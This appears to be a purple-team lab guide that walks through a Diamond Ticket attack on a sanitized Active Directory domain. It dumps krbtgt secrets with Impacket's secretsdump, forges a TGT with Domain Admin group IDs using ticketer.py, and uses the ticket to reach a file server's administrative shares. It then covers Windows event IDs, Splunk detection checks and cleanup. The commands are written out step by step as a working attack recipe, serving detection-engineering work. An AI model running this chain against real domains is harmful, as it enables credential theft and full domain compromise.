# Diamond Ticket Simulation

## Overview

This scenario demonstrates a Diamond Ticket attack in an isolated Active Directory laboratory.

The simulation follows the complete attack chain:

```text
Compromised Domain Controller
        |
        v
Extract Kerberos Secrets
        |
        v
Obtain Legitimate TGT
        |
        v
Customize TGT Identity
        |
        v
Create Diamond Ticket
        |
        v
Request Service Ticket
        |
        v
Access Kerberos Service
```

> All credentials, hashes, keys, SIDs, hostnames, and IP addresses shown below are sanitized laboratory values and are not real credentials.

---

# 1. Lab Environment

| Component         | Value                               |
| ----------------- | ----------------------------------- |
| Domain            | `lab.example.local`                 |
| Domain Controller | `dc01.lab.example.local`            |
| DC IP             | `192.0.2.10`                        |
| Attacker          | Kali Linux                          |
| Attacker IP       | `192.0.2.50`                        |
| Domain User       | `labuser`                           |
| Forged Identity   | `testuser`                          |
| Target Service    | `cifs/fileserver.lab.example.local` |
| Tooling           | Impacket                            |

---

# 2. Prerequisites

The simulation requires:

* An isolated Active Directory laboratory
* Administrative access to the laboratory domain controller
* Kerberos authentication
* Impacket
* A valid domain account
* Network connectivity between the attacker and domain controller
* Windows Security Auditing
* SIEM/log collection for Windows Security Events

---

# 3. Extract Domain and Kerberos Secrets

The first stage is to obtain the required domain secrets from the compromised domain controller.

In the original laboratory execution, `secretsdump` was used to retrieve local secrets, domain credentials, and Kerberos keys.

Sanitized example:

```bash
impacket-secretsdump \
    lab.example.local/administrator:'<LAB_PASSWORD>'@192.0.2.10
```

Example output:

```text
[*] Target system bootKey: <REDACTED_BOOTKEY>

[*] Dumping local SAM hashes

Administrator:500:<LM_HASH>:<NT_HASH>:::
Guest:501:<LM_HASH>:<NT_HASH>:::

[*] Dumping LSA Secrets

[*] $MACHINE.ACC
LAB\DC01$:<KERBEROS_KEYS>

[*] DefaultPassword
(Unknown User):<REDACTED>

[*] DPAPI_SYSTEM
dpapi_machinekey:<REDACTED>
dpapi_userkey:<REDACTED>

[*] NL$KM
<REDACTED>

[*] Dumping Domain Credentials

Administrator:500:<LM_HASH>:<NT_HASH>:::
Guest:501:<LM_HASH>:<NT_HASH>:::
krbtgt:502:<LM_HASH>:<KRBTGT_NT_HASH>:::
lab.example.local\labuser:1105:<LM_HASH>:<USER_NT_HASH>:::
DC01$:1001:<LM_HASH>:<MACHINE_NT_HASH>:::

[*] Kerberos keys grabbed

krbtgt:aes256-cts-hmac-sha1-96:<KRBTGT_AES256_KEY>
krbtgt:aes128-cts-hmac-sha1-96:<KRBTGT_AES128_KEY>

labuser:aes256-cts-hmac-sha1-96:<USER_AES256_KEY>
labuser:aes128-cts-hmac-sha1-96:<USER_AES128_KEY>

DC01$:aes256-cts-hmac-sha1-96:<MACHINE_AES256_KEY>
DC01$:aes128-cts-hmac-sha1-96:<MACHINE_AES128_KEY>
```

### Security Note

The output of `secretsdump` contains highly sensitive authentication material.

Never commit real:

* NT hashes
* AES keys
* Kerberos keys
* passwords
* machine account secrets
* DPAPI keys
* domain SIDs

to a public repository.

---

# 4. Create the Diamond Ticket

The extracted Kerberos material can be used to request a legitimate TGT and customize it for another identity.

Sanitized example:

```bash
ticketer.py \
    -request \
    -domain 'lab.example.local' \
    -user 'labuser' \
    -password '<LAB_PASSWORD>' \
    -nthash '<KRBTGT_NT_HASH>' \
    -aesKey '<KRBTGT_AES256_KEY>' \
    -domain-sid 'S-1-5-21-1111111111-2222222222-3333333333' \
    -user-id '1105' \
    -groups '512,513,518,519,520' \
    'testuser'
```

Expected output:

```text
[*] Requesting TGT to target domain to use as basis
[*] Customizing ticket for lab.example.local/testuser
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving/Updating ticket in testuser.ccache
```

The resulting credential cache is:

```text
testuser.ccache
```

---

# 5. Inspect the Kerberos Cache

Set the generated credential cache:

```bash
export KRB5CCNAME=$(pwd)/testuser.ccache
```

Inspect the cache:

```bash
klist
```

Expected output:

```text
Ticket cache: FILE:testuser.ccache
Default principal: testuser@LAB.EXAMPLE.LOCAL

Valid starting       Expires              Service principal
10/07/2026 10:00:00  10/07/2026 20:00:00  krbtgt/LAB.EXAMPLE.LOCAL@LAB.EXAMPLE.LOCAL
```

The important point is that the ticket was based on legitimate Kerberos authentication material but contains the customized identity.

---

# 6. Request a Service Ticket

Request a TGS for the target CIFS service:

```bash
KRB5_TRACE=/dev/stderr \
kvno cifs/fileserver.lab.example.local@LAB.EXAMPLE.LOCAL
```

Expected result:

```text
cifs/fileserver.lab.example.local@LAB.EXAMPLE.LOCAL: kvno = 2
```

Verify the cache:

```bash
klist
```

Expected:

```text
Ticket cache: FILE:testuser.ccache
Default principal: testuser@LAB.EXAMPLE.LOCAL

Valid starting       Expires              Service principal
10/07/2026 10:00:00  10/07/2026 20:00:00  krbtgt/LAB.EXAMPLE.LOCAL@LAB.EXAMPLE.LOCAL
10/07/2026 10:02:00  10/07/2026 20:00:00  cifs/fileserver.lab.example.local@LAB.EXAMPLE.LOCAL
```

---

# 7. Access the Target Service

The generated Kerberos credentials can then be used to authenticate to the target service.

Example:

```bash
impacket-smbclient \
    -k \
    -no-pass \
    fileserver.lab.example.local
```

Expected result:

```text
Type help for list of commands

# shares
Share Name       Type
----------------------
ADMIN$           DISK
C$               DISK
IPC$             IPC
NETLOGON         DISK
```

At this point the Kerberos authentication flow has successfully reached the target service.

---

# 8. Expected Windows Telemetry

During the simulation, monitor the Domain Controller for Kerberos-related events.

| Event ID | Description                                    |
| -------- | ---------------------------------------------- |
| 4768     | Kerberos Authentication Service ticket request |
| 4769     | Kerberos Service Ticket request                |
| 4624     | Successful logon                               |
| 4672     | Special privileges assigned to a new logon     |

The exact event sequence depends on the ticket creation method and the service being accessed.

---

# 9. Detection Validation

After completing the simulation:

```text
Diamond Ticket
      |
      v
Kerberos Authentication
      |
      v
4768 / 4769
      |
      v
Windows Event Forwarding
      |
      v
Splunk
      |
      v
Detection Rule
```

Validate that:

1. The expected Kerberos events were generated.
2. Events were successfully ingested by Splunk.
3. The Diamond Ticket detection triggered.
4. The source host and account were correctly identified.
5. Legitimate Kerberos activity does not unnecessarily trigger the detection.

See:

[`detection.spl`](./detection.spl)

---

# 10. Indicators to Record

For each simulation, record the following:

| Indicator       | Description                                 |
| --------------- | ------------------------------------------- |
| Source IP       | Host generating Kerberos activity           |
| TGT Account     | Account associated with the TGT             |
| TGS Account     | Account associated with the service request |
| Service Name    | Requested Kerberos service                  |
| Event ID        | Windows Security Event                      |
| Timestamp       | Time of authentication                      |
| Ticket Lifetime | TGT/TGS validity period                     |
| Encryption Type | Kerberos encryption type                    |

These values can be used to improve detection accuracy and reduce false positives.

---

# 11. Cleanup

After completing the simulation, remove the generated credential cache:

```bash
kdestroy 
rm -f testuser.ccache
```

If any temporary accounts, permissions, or configuration changes were created specifically for the simulation, revert them to the original laboratory state.

---

## Disclaimer

This simulation is intended for authorized security research, purple-team exercises, detection engineering, and educational purposes in isolated laboratory environments.
